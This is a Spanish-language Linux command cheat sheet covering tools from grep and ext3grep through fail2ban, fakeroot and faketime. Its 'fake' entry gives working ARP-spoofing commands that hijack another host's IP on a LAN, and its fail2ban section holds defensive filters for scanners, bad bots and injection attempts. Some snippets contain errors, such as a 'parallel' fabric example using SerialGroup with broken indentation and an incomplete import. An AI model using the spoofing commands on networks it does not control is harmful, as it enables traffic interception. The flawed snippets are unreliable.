Mostrar lineas que empiecen por # y las que terminen en 0:
	$ grep -E '^#|0$' file
Buscar lineas que tengan : seguidos de una barra que ha de escaparse:
	$ grep ':\/' file
Buscar las lineas que tengan una "o" seguida de al menos 3 dígitos:
	$ grep 'o[0-9]\{3\}' file
Buscar lineas que tengan algún dígito:
	$ grep '[[:digit:]]' file
Buscar lineas que empiecen por un caracter alfabético:
	$ grep '^[[:alpha:]]' file
Buscar lineas que tengan "ext" usando parentesis:
	$ grep '\(ext\)' file
Buscar lineas que que tengan un número entre 2 y 9 al menos una vez y esten precedidos de espacio, tabulación o salto de linea:
	$grep -E '\s[2-9]+' file
Mostrar lineas con entre 3 y 6 letras mayúsculas:
	$ grep '[A-Z]\{3,6\}' file
Algunos casos comentados:
1.-
$ touch nada.8.sh.5
	$ ls | grep '.*.[6-8].*.[1-6]'
Nota.- Cuando se usen con el comando grep han de ir siempre encerradas con comillas simples.
	.* (Cero o más caracteres. El punto inicial es imprescindible)
	.[6-8] (Seguidos de un punto y un número que contenga entre el 6 y el 8)
	.* (seguido un punto y cero o más caracteres)
	.[1-6] (y terminado con un punto seguido de un número que contenga del 1 al 6)
Nota.- Los corchetes NO indican UN número de un dígito sinó un número que contenga el margen especificado [6,7,8 para el primer corchete y 1,2,3,4,5,6 para el segundo, por tanto también listaría el archivo nada.0357.sh.389 pero no nada.0352.sh.389 porque el número 0352 no contiene ninguno del margen especificado.
Nótese la diferencia en la expresión regular usando el comando mv [sin comillas simples y sin el punto delante del primer asterisco]:
	$ mv *.[6-8].*.[1-6] prueba
2.-
Buscar en el directorio scripts, todos los que sean de bash:
	$ grep -i '^#.*bash' scripts/*
		^#.*bash (Que el primer caracter de la primera linea sea # y que despues de cero o más caracteres aparezca la palabra bash)
		$ grep -i '$.*bash' scripts
		'$.*bash' (En todos los ficheros del directorio, que al final de la primera linea y despues de cero o más caracteres apararezca la palabra bash)
3.-
Ver los correos electrónicos completos de una lista en la que los hay incompletos:
$ cat lista
	juangomez@gmail.com
	clarafuentes@
	@yahoo.es
	ant.rodri-perez@hotmail.nadadenada
	pedro@blog.empresa.travel
	$ grep -E '^[a-zA-Z._-]+@[a-zA-Z0-9.]+\.[a-z]+$' lista
		^[a-zA-Z._-]+ (Que empiece con una palabra que pueda contener mayúsculas, minúsculas, puntos, guiones o guiones bajos)
		@ (Seguida de una @ literal)
		[a-zA-Z0-9.]+ (A continuación varios caracteres que pueden ser mayúsculas, minúsculas, puntos o números)
		\. (Después un punto literal)
		[a-z]+$ (Para terminar, uno o varios caracteres en minúscula)
	$ grep -E '^[a-zA-Z._-]+@.[a-zA-Z.0-9]+\.[[:alpha:]]{2,3}$' lista (Sólo mostrará las que terrminen con 2 o 3 letras)


ext3grep
Herramienta para recuperar archivos eliminados en sistemas de archivos ext3. Funciona escaneando el sistema de archivos en busca de inodos que han sido marcados como eliminados pero que aún contienen datos recuperables.
$ ext3grep /dev/sda1 --restore-file ruta/archivo/eliminado.txt (intentará recuperar el archivo eliminado.txt que estaba en ruta/al/archivo/)
$ ext3grep /dev/sda1 --restore-all (buscará y recuperará todos los archivos eliminados)
$ ext3grep /dev/sda1 --restore-all --output-dir /ruta/directorio/recuperacion/ (especificar un directorio de destino para la recuperación)
$ ext3grep /dev/sda1 --dump (lista de archivos que han sido eliminados, junto con información sobre su ubicación en el sistema de archivos)
Nota.- Es recomendable desmontar la partición antes de usar ext3grep para evitar modificación de datos que podrían dificultar la recuperación y evitar escribir en la partición en la que se desea recuperar archivos.


ext4magic
Recuperación de ficheros ext3 y ext4 borrados o sobrescritos.
# ext4magic /dev/sda2 -m -d . -f user (recuperar sólo los archivos borrados [-m] de nuestra $HOME [/dev/sda2], el resultado en el presente directorio [-d .] y del usuario "user" [-f])
Algunas opciones:
-M (Emplear esta opción cuando se ha borrado todo el sistema de ficheros)


extlinux
Cargador de arranque para sistemas de archivos Linux ext2/ext3/ext4, btrfs y xfs que se utiliza para instalarlo en una partición específica, permitiendo que el sistema arranque un kernel de Linux. A diferencia de otros cargadores como GRUB, extlinux es más ligero y simple, ideal para configuraciones minimalistas o sistemas embebidos.
# extlinux --install /boot (instala los archivos necesarios del cargador de arranque en /boot)
Nota.- Verificar que en la partición donde se instala, en /boot, contenga los archivos /boot/vmlinuz [el kernel], /boot/initrd.img y /boot/extlinux/extlinux.conf [el archivo de configuración creado exproceso]
# dd if=/usr/lib/EXTLINUX/mbr.bin of=/dev/sda (actualizar el sector de arranque de la partición, por ejemplo /dev/sda. Sobrescribe el MBR [Master Boot Record])
Un ejemplo de archivo de configuración podría ser:
# nano /boot/extlinux/extlinux.conf
       TIMEOUT 50
       DEFAULT debian
       #
       LABEL debian
         SAY Booting Debian...
         KERNEL /vmlinuz-5.10
         APPEND root=/dev/sda1 ro quiet
         INITRD /initrd.img-5.10
       #
       LABEL oldkernel
         SAY Booting older kernel...
         KERNEL /vmlinuz-5.4
         APPEND root=/dev/sda1 ro quiet
         INITRD /initrd.img-5.4
Espera 5 segundos antes de arrancar, la opción predeterminada es 50 décimas de segundo.


extra-xdg-menus
Proporciona menús adicionales para los entornos de escritorio que siguen las especificaciones de menú de XDG, como GNOME, KDE, XFCE, LXQt, etc. Los menús adicionales se pueden habilitar o deshabilitar por sistema o por usuario con los scripts suministrados: exmenen y exmendis.
$ exmenen --system electronics (habilitar el menú electronics si se encuentra en /etc/xdg/menus/extra/)
$ exmendis --system electronic (deshabilitarlo)
$ exmenen --user desarrollo (agregará el menú "desarrollo" solo a la configuración de usuario)
$ xdg-desktop-menu forceupdate (después de habilitar o deshabilitar menús, a veces es necesario reiniciar la sesión o forzar la actualización del menú)
1.-
Modificar o crear un menú propio
$ nano ~/.config/menus/custom.menu
       <!DOCTYPE Menu PUBLIC "-//freedesktop//DTD Menu 1.0//EN" "http://www.freedesktop.org/standards/menu-spec/menu-1.0.dtd">
       <Menu>
           <Name>Custom</Name>
           <Directory>custom.directory</Directory>
           <Include>
              <Category>Development</Category>
           </Include>
       </Menu>
Luego, habilitarlo con exmenen.


extrace
rastrea todas las ejecuciones de programas que ocurren en un sistema, o el subconjunto de ejecuciones de programas realizadas por un proceso determinado y sus descendientes.
# extrace -p 1779652 (monitorear las ejecuciones de programas lanzados por un proceso específico. El PID 1779652)
# extrace -u firefox (mostrar tambien el usuario que ejecuta el proceso)
# extrace -- brave-browser -o brave.txt (monitorear los procesos de la aplicación y guardarlos en brave.txt)


extract
Similar al conocido comando file [ver], puede mostrar metadatos de un archivo e imprimir los resultados en stdout.
$ extract -L (mostrar todas las palabras clave)
$ extract imagen.png (forma básica)
$ extract -V -x mimetype imagen.png (excluir determinada palabra clave en la salida)
$ extract -p "page count" archivo.pdf (imprimir solo la clave mencionada)


extrepo
Herramienta en Debian que facilita la adición de repositorios externos de manera segura y estructurada. Permite a los usuarios agregar repositorios adicionales de software que no están mantenidos por Debian, pero que han sido revisados y listados en la base de datos de extrepo.
# extrepo enable mozilla (habilita el repositorio especificado, colocandolo en /etc/apt/sources.list.d/extrepo_mozilla.sources)
# extrepo disable mozilla (lo inhabilita)
# extrepo search vivaldi (buscar si existe en la base de datos)
# extrepo update mozilla (actualizar el paquete)


extsmail
Herramienta diseñada para actuar como un reemplazo del programa sendmail en sistemas UNIX. Su función principal es leer mensajes de correo electrónico y luego enviarlos a través de comandos externos definidos por el usuario, generalmente utilizando SSH para conectarse a servidores remotos que ejecutan un Agente de Transferencia de Correo [Mail Transfer Agent - MTA].
$ extsmail --ssh mail.example.com --user myuser --command "/usr/sbin/sendmail" (servidor remoto al que conectarse, usuario con el que conectarse al servidor remoto y comando a ejecutar en el servidor remoto para enviar el correo)


extundelete
[e2fsprogs, e2fslibs, e2fslibs-dev, g++, build-essential]. Recuperación de archivos o directorios borrados. La partición sobre la que se actua ha de estar desmontada. Descargar la aplicación de <http://extundelete.sourceforge.net/> e instalarla con el clasico ./configure, make, sudo make install.
# extundelete  /dev/sda11 --restore-directory /datos/dir_borrado (recuperar el directorio dir_borrado de la partición /dev/sda11. Lo guardará en el directorio RECOVERED_FILES)
# extundelete  /dev/sda11 --restore-file /datos/imagenes/foto.png -o fotos/ (recuperar un archivo y guardarlo en el directorio fotos)
# extundelete /dev/sda11 --restore-all (recuperar toda una partición)
# extundelete /dev/sda11 --restore-files files (recuperar de la partición /dev/sda11 los archivos enumerados en "files" a razón de uno por linea)


exuberant-ctags
Herramienta para analizar el código fuente y generar un índice de etiquetas que mapea nombres de funciones, variables, clases y otros elementos a sus ubicaciones en los archivos.
$ ctags-exuberant --list-languages (listado completo de lenguajes soportados)
$ ctags-exuberant --list-kinds=python (lista de todos los tipos de etiquetas para el idioma especificado)
$ ctags-exuberant --list-kinds=all (lista las de etiquetas de todos los lenguajes)
$ ctags-exuberant -f mi_indice.tags -R script.sh (guardando los resultados en mi_indice.tags en el presente directorio)
$ ctags-exuberant --exclude=node_modules --exclude=vendor -R file.py. (excluir ciertas carpetas como node_modules o vendor)


eyed3
Herramienta para añadir, editar y eliminar etiquetas ID3 en archivos MP3. Las etiquetas ID3 son metadatos que se utilizan para almacenar información sobre el archivo de audio, como título, artista, álbum, año, duración, entre otros.
$ eyed3 cancion.mp3 (mostrará información sobre el título, artista, álbum, año, y otros metadatos del archivo cancion.mp3)
$ eyed3 --title "La Vida es Bella" --artist "Juan Pérez" --album "Éxitos 2023" cancion.mp3 (establecerá el título, el artista y el álbum del archivo cancion.mp3)
$ eyed3 --remove title archivo.mp3 (eliminar una etiqueta específica)
$ eyed3 --to-v2.3 cancion.mp3 (convertir etiquetas de ID3v1 a ID3v2)


eza
Moderno reemplazo del clásico ls y el no mantenido exa.
$ eza (mostrar archivos y directorios sin los ocultos)
$ eza -l --group-directories-first (como el anterior pero los directorios primero)
$ eza -D (solo mostrar los directorios)
$ eza -a (mostrar todos incluidos los ocultos)
$ eza -T (en forma de arbol)


eztrace
Herramienta diseñada para generar automáticamente trazas de ejecución de programas en entornos de computación de alto rendimiento [High Performance Computing - HPC]. Facilita la recopilación de trazas de ejecución de manera automática y permite analizar aspectos clave como el uso de memoria, cuellos de botella, rendimiento, comunicación MPI [Message Passing Interface] y concurrencia.
# eztrace -v -d script (modo verbose, debug y script que se ejecuta)


f2fs-tools
[Flash-Friendly File System]. Sistema de archivos para Linux diseñado para dispositivos de almacenamiento basados en memoria flash NAND [Not AND], como SSD, eMMC y tarjetas SD. Se basa en el Sistema de Archivos Estructurado por Registros [Log-structured File System - LFS]. Las herramientas de este paquete permiten la creación, verificación, reparación y administración de sistemas de archivos F2FS: mkfs.f2fs [formatea una partición], fsck.f2fs [verifica y repara un sistema], dump.f2fs [extrae información detallada], resize.f2fs [redimensiona], f2fs_io [herramienta de depuración para acceder directamente a archivos en F2FS] y f2fs_gc [ejecuta la recolección de basura manualmente].
# mkfs.f2fs /dev/sdb1 (formatear /dev/sdb1 con F2FS)
# mkfs.f2fs -f -a 2 -s 512 /dev/sdb1 (fuerza el formateo, activa la función de auto-recolección de basura y tamaño del sector en bytes.)
# mount -t f2fs /dev/sdb1 /mnt (después de formatear la partición, se puede montar normalmente)
# fsck.f2fs /dev/sdb1 (comprobar la integridad del sistema de archivos si hay errores, se intentarán corregir automáticamente)
# resize.f2fs /dev/sdb1 (ajustará el sistema de archivos al tamaño de la partición.)
# dump.f2fs /dev/sdb1 (muestra datos como la cantidad de bloques usados, tamaño del segmento, versión de F2FS, etc)
# f2fs_gc /mnt (libera bloques no utilizados y mejora el rendimiento)


f3
[Fight Flash Fraud o Fight Fake Flash]. Prueba la capacidad total de una tarjeta flash [unidad flash, disco flash, pendrive]) para comprobar si coincide con las características que deberia tener. f3 escribe en la tarjeta y luego comprueba si puede leerla. No respeta los contenidos de la unidad o sea que es preferible que este vacia. Consta de varios ejecutables: f3brew, f3fix, f3probe, f3read y f3write.
# f3brew -d /dev/sdb (verificar si el firmware de una memoria USB es fraudulento o haya sido modificado para mostrar más capacidad de la real)
# f3probe /dev/sda (identificar de forma rápida los falsos pendrives/tarjetas y ver su tamaño real)
# f3fix /dev/sda (comprobar la capacidad real del dispositivo que podemos utilizar para no perder datos)
# f3write /dev/sda (escribe archivos de gran tamaño en el dispositivo)
# f3read /dev/sda (Se encarga de comprobar que lo que ha escrito es correcto)
# f3probe --destructive /dev/sdb (borra todos los datos de la unidad y analiza la memoria real del dispositivo proporcionando datos sobre su capacidad real)


faac
[Freeware Advanced Audio Coder]. Herramienta para codificar audio en el formato AAC [Advanced Audio Coding]. FAAC es el codificador, mientras que FAAD2 es el decodificador que permite reproducir audio AAC.
$ faac audio.wav -o audio.aac (convertir un .wav a .aac)
$ faac -b 192000 audio.wav -o audio.aac (codificar el archivo con una tasa de bits de 192 kbps)
$ faad audio.aac -o output.wav (decodificar un archivo AAC y convertirlo de nuevo a WAV)


faad
Decodificador de audio ISO AAC. Decodifica correctamente todos los archivos AAC de tipo objeto MPEG-4 y MPEG-2 MAIN, LOW, LTP, LD y ER principalmente para reproducirlos.
$ faad -i archio.aac (muestra información del archivo)


fabric
Herramienta de automatización y despliegue que permite ejecutar tareas en múltiples servidores de manera remota en serie o en paralelo. Se utiliza principalmente a través de un archivo de script Python llamado fabfile.py. En este archivo, se define las tareas que se han de ejecutar en los servidores remotos.
1.-
Para ejecutar en un servidor remoto el comando uname -a para obtener información del sistema.
$ nano fabfile.py
       from fabric import Connection
       #
       def obtener_info():
        c = Connection('usuario@servidor_remoto')
        result = c.run('uname -a', hide=True)
        print(f"Resultado: {result.stdout}")
$ fab obtener_info (se conectará al servidor remoto especificado, ejecutará el comando uname -a, y mostrará el resultado)
2.-
Ejecutar comandos en múltiples servidores en paralelo
$ nano fabfile.py
       from fabric import Connection, SerialGroup
       #
       def obtener_info_paralelo():
        servidores = ['usuario@servidor1', 'usuario@servidor2', 'usuario@servidor3']
        grupo = SerialGroup(*servidores)
        resultados = grupo.run('uname -a', hide=True)
        for conexion, resultado in resultados.items():
        print(f"{conexion.host}: {resultado.stdout}")
$ fab obtener_info_paralelo (conectará a cada uno de los servidores listados y ejecutará el comando uname -a en paralelo, mostrando los resultados)


facedetect
Detector de rostros sencillo para procesamiento por lotes. Responde a la pregunta básica: "¿Hay un rostro en esta imagen?" y proporciona como resultado un código de salida para indicar si se detectó un rostro o no o las coordenadas de los rostros detectados en la salida estándar.
$ facedetect foto.jpg (detectar rostros y obtener sus coordenadas)
$ facedetect --center foto.jpg (obtener solo las coordenadas del centro de la cara)
$ facedetect -q foto.jpg (verificar la presencia de rostros. Si hay un rostro, el comando devuelve 0 y si no lo hay, devuelve 2)
$ facedetect --biggest foto.jpg (detectar solo el rostro más grande)


facter
Muestra información del sistema tanto aspectos de hardware como de software.
$ facter (Muestra la totalidad de la información)
$ facter architecture kernel hardwaremodel kernelrelease ipaddress lsbdistdescription (Muestra sólo los aspectos especificados)
$ facter --list-block-groups (Lista de grupos de bloques)
$ facter -p (cargue las bibliotecas de Puppet, lo que permitirá que Facter cargue datos específicos de Puppet)
$ facter -t (muestra cuanto tiempo toma resolver cada hecho)


factor
Sacar todos los factores de un número.
$ factor 100


fadecut
[streamripper, sox, lame, vorbis-tools]. Herramienta para ripear transmisiones de audio, cortar, hacer fundidos de entrada y salida y etiquetar los archivos de audio resultantes. Los logotipos y la publicidad de las estaciones de radio se eliminan automáticamente. Los archivos de audio descargados se cortan mediante detección de silencio y luego se funden de entrada y salida. Posteriormente, los archivos se codifican a OGG o MP3 y se etiquetan con etiquetas (título, artista, género y comentario). En modo archivo, Fadecut simplemente procesa archivos de audio ya ripeados.
$ fadecut -c swisspop (abre un editor para configurar el perfil de audio y lo guarda en ~/.fadecut/profiles/swisspop)
Un ejemplo podría ser:
        STREAM_URL="https://kissfm.kissfmradio.cires21.com/kissfm.mp3"
        # Formato de archivo de destino preferido (ogg/mp3)
        ENCODING=ogg
        GENRE="Pop"
        COMMENT="Música mucho rato"
        # Segundos de fundido al inicio y final.
        FADE_IN=1
        FADE_OUT=4
        # Segundos a recortar al inicio y final
        TRIM_BEGIN=0
        TRIM_END=0
$ fadecut -p swisspop -r (usar el perfil swisspop y activar el modo streaming con streamripper)
El audio se descargará, cortará, procesará con fundidos y etiquetará. Los archivos procesados aparecerán en la carpeta new/ en el directorio actual y los que contengan errores en error/. Para detener la grabación, presionar Ctrl+C. Otras carpetas que fadecut puede crear o crearlas el usuario en el directorio actual son: incomplete/: Archivos parcialmente ripeados por streamripper, done/: Archivos que se desea conservar tras escucharlos y dontlike/: Canciones no deseadas y que no se reprocesan.
1.-
Si ya se posee un directorio con archivos MP3
$ cd /home/usuario/musica/
$ fadecut -p swisspop (procesará los archivos en el directorio actual, aplicando los parámetros del perfil [corte, fundidos, etiquetas] y guardando los resultados en new/)
$ fadecut -p swisspop -k (conservar los archivos originales ripeados sin procesar y los coloca en el directorio orig/)
$ fadecut -e swisspop (editar el archivo del perfil)
2.-
Un ejemplo de archivo de configuración personal podria ser
$ nano ~/.fadecut/fadecutrc
         # Perfil por defecto si no se especifica con -p
         PROFILEDIR="$HOME/.fadecut"
         PROFILE=swisspop
         #
         PWD=$(pwd)
         WORKDIR="$PWD"
         #
         # Formato de salida preferido
         ENCODING=mp3
         #
         # Segundos de fundido por defecto
         FADE_IN=2
         FADE_OUT=3
         #
         # Segundos a recortar por defecto
         TRIM_BEGIN=1
         TRIM_END=1
         #
         # Directorios organizados para los archivos procesados
         OUTPUTDIR="$PWD/nuevo"
         ORIGDIR="$PWD/original"
         DONEDIR="$PWD/conservar"
         INCOMPLETEDIR="$PWD/incompleto"
         ERRORDIR="$PWD/error"
         DONTLIKEDIR="$PWD/noprocesar"
Con un archivo fadecutrc como el anterior se puede lanzar la aplicación:
$ fadecut -k (guardando los originales y sin especificar -p)


fades
Herramienta diseñada para simplificar la gestión de entornos virtuales y dependencias que automatiza la creación y activación de entornos virtuales, así como la instalación de paquetes necesarios para ejecutar scripts o proyectos. Esto es especialmente útil para evitar conflictos entre dependencias y asegurar que los scripts se ejecuten en un entorno controlado.
$ fades -r requirements.txt script.py (con un archivo requirements.txt con las dependencias)
$ fades -m http.server 8000 (iniciará un servidor HTTP en el puerto 8000, gestionando automáticamente cualquier dependencia necesaria)
1.-
Ejecutar un script con dependencias específicas
Suponiendo que se tiene script.py que requiere las bibliotecas "requests" y "numpy", en lugar de instalar estas dependencias manualmente, se puede usar fades para ejecutar el script en un entorno virtual con las dependencias instaladas automáticamente:
$ fades -d requests -d numpy python script.py
fades creará un entorno virtual, instalará requests y numpy, y ejecutará script.py en ese entorno.
2.-
Se puede incluir las dependencias directamente en el script
         # fades import requests
         # fades import numpy
         import requests
         import numpy as
         ...
$ fades script.py (ejecutar el script con fades)
fades leerá los comentarios y gestionará las dependencias automáticamente.



fai-client
FAI [Fully Automatic Installation] es un sistema diseñado para instalaciones y configuraciones automatizadas de sistemas Linux de manera no interactiva y configuraciones de software en ordenadores, así como en máquinas virtuales y entornos chroot, desde pequeñas redes hasta grandes infraestructuras y clústeres. Su enfoque principal es la automatización y la personalización sin intervención manual.
# fai -v -s file:///srv/fai/config softupdate (información detallada, ubicación del espacio de configuración y que se ejecutará una actualización suave)
1.-
Instalar un sistema en un directorio [dirinstall] para probar una instalación de Debian
# fai -v -s file:///srv/fai/config --hostname test-machine -c DEFAULT,DEBIAN dirinstall /tmp/test-install
"-c DEFAULT,DEBIAN" Define las clases que se usarán para la instalación, en este caso, DEFAULT y DEBIAN, que determinan qué paquetes y configuraciones se aplican, nombre de host especifico y "dirinstall /tmp/test-install"  donde se realiza la instalación. El resultado es un sistema Debian funcional instalado en /tmp/test-install, listo para ser usado como chroot o para empaquetarlo como imagen.


faifa
Herramienta de red para administrar remotamente dispositivos HomePlug 1.0 y HomePlug AV que son especificaciones de la comunicación por línea eléctrica [Power Line Communication - PLC] que es un sistema para transportar datos a través de la línea eléctrica. Estos dispositivos son útiles para extender una red de datos utilizando la infraestructura eléctrica existente en un hogar o edificio y pertime configurar, actualizar y recopilar estadísticas de estos dispositivos mediante tramas Ethernet privadas y públicas.
$ faifa -d (buscará en la red dispositivos que respondan a la comunicación HomePlug)
$ faifa -i [dirección_MAC] (ver detalles específicos de un dispositivo)
$ faifa -c [nuevo_nombre] -p [nueva_contraseña] [dirección_MAC] (cambiar la configuración de un dispositivo, como su nombre o la contraseña de acceso de un dispositivo)
$ faifa -m (mostrará estadísticas sobre la calidad de la conexión, la velocidad de transferencia de datos, etc)


fail2ban
Cortafuegos. Habilitar los servicios en los que se quiera que actue el cortafuegos [ssh, apache2, ftp....] editando /etc/fail2ban/jail.conf y substituyendo el “false” por “true”. Algunos parámetros de este archivo son:
	ignoreip  (lista de IPs separadas por un espacio en blanco que no serán bloqueadas)
	bantime (tiempo en segundos que un host permanecerá bloqueado)
	maxretry (número máximo de intentos de login fallidos antes de ser bloqueado)
	filter (filtro usado según el archivo /etc/fail2ban/filter.d)
	logpath (archivo que utiliza para revisar los intentos de login)
Un ejemplo muestra de configuración para el servicio ssh:
	[ssh]
	enabled  = true
	port     = ssh
	filter   = sshd
	logpath  = /var/log/auth.log
	maxretry = 3
# tail -f /var/log/fail2ban.log | grep Ban    (monitorizar las ip baneadas)
# awk '($(NF-1) = /Ban/){print $NF}' /var/log/fail2ban.log | sort | uniq -c | sort (Solo muestra las Ips.)
# awk '($(NF-1) = /Ban/){print $NF,"("$NF")"}' /var/log/fail2ban.log | sort | logresolve | uniq -c | sort  (Mostrando el nombre del host)
# systemctl status fail2ban (comprobar el estado de fail2ban)
# fail2ban-client status (comprobar los servicios activos)
# fail2ban-client -i (entrar en el prompt de fail2ban)
# fail2ban-client status sshd (comprobar bloqueos de ips por ataques a ssh)
# fail2ban-client set mysqld-auth unbanip IP (borrar una ip bloqueada del servicio mysql-auth)
# fail2ban-testcases (realizar un test general))
1.-
Bloquear errores w00tw00t.at.ISC.SANS en los logs de apache. En realidad estas peticiones no acaban en ningún ataque concreto. Estan producidos por el escaner de puertos Dfind que al generar sus peticiones coloca "w00tw00t.at.ISC.SANS.DFind".
Crear el archivo:
# nano /etc/fail2ban/filter.d/apache-w00tw00t.conf
Pegar el siguiente contenido:
	[Definition]
	failregex = ^.*\[client <HOST>\].*w00tw00t\.at\.ISC\.SANS\.*.*
	ignoreregex =
Añadir la jaula:
# nano /etc/fail2ban/jail.conf
Y pegar:
	[apache-w00tw00t]
	enabled = true
	filter = apache-w00tw00t
	action = iptables-allports[name=w00tw00t]
	logpath = /var/log/apache*/error.*.log
	maxretry = 1
	bantime = -1
Nota.- el bantime = -1 indica bloquear permanentemente.
2.-
Algunos ajustes de jail.conf para el caso de usar nginx y no apache:
# nano /etc/fail2ban/jail.conf
Prevenir ataques de inyeccion de codigo
	[php-url-fopen]
	enabled = true
	port    = http,https
	filter  = php-url-fopen
	logpath = /var/log/nginx/access_log
	maxretry = 1
Bloquea por iptables un día a los hosts que se conectan haciendo  uso de un "User Agent" sospechoso
	[nginx-badbots]
	enabled  = true
	filter = apache-badbots
	action = iptables-multiport[name=BadBots, port="http,https"]
	logpath = /var/log/nginx*/*access*.log
	bantime = 86400
	maxretry = 1
Solicitar 240 páginas en 1 minuto o 4 paginas segundo, bloqueo por dos dias
	[nginx-dos]
	enabled = true
	port    = http,8090
	filter  = nginx-dos
	logpath = /var/log/nginx/access.log
	findtime = 60
	bantime  = 172800
	maxretry = 240
Fallar la autentificación en el servidor web, bloqueo por 10 minutos
	[nginx-auth]
	enabled = true
	port = http
	filter = nginx-auth


faillock
Herramienta para visualizar y modificar la autenticación archivos de registro de fallas. Muy parecida a faillog.
# faillock --dir /var/log (directorio donde se guardan los registros de intentos fallidos)
# faillock --user USER


faillog
El módulo pam_faillock.so mantiene una lista de intentos fallidos de autentificación por usuario durante un intervalo especificado y bloquea la cuenta en caso de que hubiera varios intentos consecutivos de autentificaciones fallidas.
# faillog -u USER (de un usuario)
# faillog -r -u USER (borrar los registros del usuario mencionado)
# faillog -a (todos)


fair
Se utiliza para implementar balanceadores de carga para conexiones TCP. Consta de dos daemons: Carrousel [realiza servicios de balanceo de carga] y Transponder [se ejecuta en los servidores destinados a recibir el tráfico balanceado].
Configuración básica de ejemplo:
# nano /etc/fair/transponder.conf
       # Lista de direcciones IP de los servidores
       server 192.168.1.100
       server 192.168.1.101
       server 192.168.1.102
       #
       # Puerto de escucha
       port 12345
       #
       # Dirección IP y puerto donde se encuentra Carrousel
       carrousel 192.168.1.103 12346
       ...
$ fair start session_name (iniciar una sesión de balanceo)
$ fair status session_name (verificar el estado de una sesión)
$ fair stop session_name (detener una sesión)
$ fair delete session_name (eliminar una sesión)
$ fair list sessions (mostrar todas las sesiones activas)
1.-
Ejemplo para crear una sesión de balanceo de carga para un servicio web. Primero configurar el archivo carrousel.conf en el servidor que ejecutará Carrousel:
# nano /etc/fair/carousel.conf
       # Servidor que actuará como Carrousel
       server 192.168.1.103
       #
       # Puertos de escucha
       http_port 80
       https_port 443
       #
       # Lista de servidores Transponder
       transponder 192.168.1.100:12345
       transponder 192.168.1.101:12345
       transponder 192.168.1.102:12345
       #
       # Configuración de red
       interface eth0
       netmask 255.255.255.0
       gateway 192.168.1.1
       ...
Luego, en el cliente, crear una sesión:
$ fair create session my_web_session http://192.168.1.103:80
$ fair status my_web_session (verificar estado de la sesión)


fake
Herramienta que permite realizar suplantación de direcciones IP en una red local mediante la manipulación de ARP [Address Resolution Protocol]. Su propósito principal es permitir la conmutación de servidores de respaldo en una LAN, pero también puede usarse para pruebas de seguridad y diagnóstico de red. Activa una segunda interfaz en la máquina host con la dirección IP que se desea "robar" luego envía paquetes ARP para asociar esa dirección IP con la MAC de la interfaz secundaria y asi permite que el tráfico destinado a la IP original sea recibido por la máquina que ejecuta fake.
$ fake -i eth1 -a 192.168.1.100 (enviará paquetes ARP para asociar 192.168.1.100 con la MAC de eth1, permitiendo que la máquina en la que se ejecuta fake reciba el tráfico de la IP suplantada)
$ fake -i eth1 -m ("-m" activa el modo "multi-interfaz", permitiendo que la misma IP esté en varias interfaces del mismo host)
$ fake -i eth1 -a 192.168.1.100 -f ("-f" fuerza la emisión de paquetes ARP periódicos para mantener la suplantación de la IP)
$ fake -r (establece la configuración de red y deja de suplantar la IP)


fake-hwclock
Guardar/restaurar el reloj del sistema en máquinas sin hardware RTC [RealTime Clock] en funcionamiento. Algunas máquinas no tienen una unidad de reloj en tiempo real en funcionamiento o no tienen un controlador para dicho hardware. fake-hwclock es un conjunto simple de scripts que guarda el reloj actual del kernel periódicamente, incluso al apagar y lo restaura al arrancar para que el reloj del sistema se mantenga al menos cerca del tiempo real.
$ fake-hwclock load force (ajustar la hora del sistema al reloj guardado)
$ fake-hwclock save force (guarda la hora archivo. "force" para anular la comprobación de seguridad)


faked-tcp
[fakeroot]. Demonio que recuerda la propiedad/permisos falsos de archivos manipulados por procesos fakeroot.
# faked-tcp --debug (muestra información por pantalla)


fakechroot
Proporciona un entorno chroot falso que precarga una biblioteca que anula algunas funciones de la biblioteca C estándar [libc], lo que permite usar herramientas específicas para root sin privilegios de root. Incluye las herramientas env.fakechroot, ldd.fakechroot y chroot.fakechroot
$ fakechroot chroot /path/to/chroot /bin/bash (abrirá un shell de Bash en el directorio /path/to/chroot como si estuvieras dentro de un entorno chroot)
$ env.fakechroot /bin/sh (ejecutar un shell sh dentro de un entorno chroot falso)
$ ldd.fakechroot /usr/bin/ls (mostrará las dependencias dinámicas del ejecutable "/usr/bin/ls" dentro del entorno chroot falso)
$ chroot.fakechroot /bin/bash (abre una sesión de bash dentro del entorno chroot falso, permitiendo ejecutar comandos como si estuvieras en un sistema raíz completo)
$ fakechroot fakeroot chroot /ruta/a/un/sistema (hacer chroot sin privilegios y dentro del chroot simular permisos de root lo que permite trabajar dentro de un entorno chroot falso y al mismo tiempo simular permisos de root dentro de él)
Nota.- No todas las herramientas de root funcionan correctamente en este entorno falso y algunas operaciones que requieren acceso directo al hardware no están disponibles.
1.-
Creación de un entorno de desarrollo
$ mkdir -p ~/chroot/usr/bin
$ cp /bin/ls ~/chroot/usr/bin/
$ fakechroot chroot ~/chroot /usr/bin/ls
ejecutará el comando ls desde el entorno simulado, aunque en realidad no se está en un chroot real.


fakeroot
Ejecuta comandos en un entorno que simula privilegios de root. No aumenta los privilegios de un usuario ni disminuye la seguridad del sistema. Las herramientas incluidas son: fakeroot-sysv: Implementación de fakeroot basada en System V IPC, más antigua, pero aún funcional, fakeroot-tcp: Implementación basada en TCP, útil para sistemas donde System V IPC no funciona bien, faked-sysv: Demonio usado por fakeroot-sysv y faked-tcp: Demonio usado por fakeroot-tcp.
$ fakeroot -u dpkg-repack paquete (Crea un archivo .deb a partir de un paquete instalado en el sistema.)
$ fakeroot /bin/bash (ejecutar bash como root)
1.-
Crear un archivo con permisos de root sin realmente serlo:
$ fakeroot-sysv bash
$ touch /rootfile
$ chown root:root /rootfile
$ ls -l /rootfile
El archivo parecerá haber sido creado por root, pero en realidad, sigue siendo del usuario normal.
2.-
Si en el sistema fakeroot-sysv presenta problemas, se puede usar la versión basada en TCP:
$ fakeroot-tcp bash
$ mkdir /fake-root-dir
$ chmod 700 /fake-root-dir
$ ls -ld /fake-root-dir
Esta implementación usa un enfoque diferente para emular permisos de root.


faketime
Herramienta que permite modificar la fecha y hora que un programa percibe, sin alterar la hora real del sistema. La biblioteca de precarga de hora falsa [Fake Time Preload Library - FTPL], intercepta diversas llamadas del sistema que los programas utilizan para obtener la fecha y hora actuales. A continuación, puede informar a estos programas sobre fechas y horas falsificadas.
$ faketime "2020-01-01 12:00:00" date (que el comando "date" piense que es el 1 de enero de 2020 a las 12:00 PM)
$ faketime "2050-12-25 00:00:00" bash -c 'echo "Hoy es $(date)"' (Simular una fecha futura con un texto)
